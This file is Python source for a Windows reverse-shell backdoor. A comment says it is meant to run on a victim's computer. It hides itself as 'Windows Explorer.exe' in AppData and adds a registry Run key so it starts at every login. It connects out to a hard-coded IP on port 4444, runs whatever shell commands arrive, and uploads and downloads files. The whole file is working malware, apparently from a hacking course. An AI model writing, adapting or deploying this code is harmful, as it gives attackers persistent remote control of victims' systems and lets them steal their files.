#!/usr/bin/env python
# This program will be executed on the victim's computer

import socket
import subprocess
import simplejson
import os
import base64
import sys
import shutil


class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def reliable_send(self, data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return simplejson.loads(json_data.decode("utf-8"))
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content.encode("utf-8")))
            return "[+] Upload successful"

    def run(self):
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)

            except Exception:
                command_result = "[-] Error during command execution"

            self.reliable_send(command_result)

try:
    my_backdoor = Backdoor("192.168.220.128", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()